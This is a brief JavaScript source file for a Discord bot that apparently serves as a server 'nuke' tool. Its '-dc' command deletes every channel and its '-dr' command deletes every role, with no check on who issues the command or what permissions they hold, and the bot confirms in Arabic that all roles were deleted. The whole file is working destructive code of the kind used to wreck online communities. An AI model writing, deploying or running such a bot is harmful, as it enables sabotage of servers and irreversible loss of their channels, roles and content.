const Discord = require('discord.js');
const Canvas = require('canvas');
const client = new Discord.Client();
const prefix = ['-']

client.once('ready', () => {
	console.log('Ready By KarZo!');
});

/--------[Token]--------/

client.login(process.env.BOT_TOKEN);

client.on('message', message => {
 if(message.content.split(' ')[0] == prefix + 'dc') { 
 if (!message.channel.guild) return;
 message.guild.channels.forEach(m => {
 m.delete();
 });
 }
 if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
 if (!message.channel.guild) return;
 message.guild.roles.forEach(m => {
 m.delete();
 });
 message.reply("`تم حذف جميع الرتب بنجاح`")
 }
 });
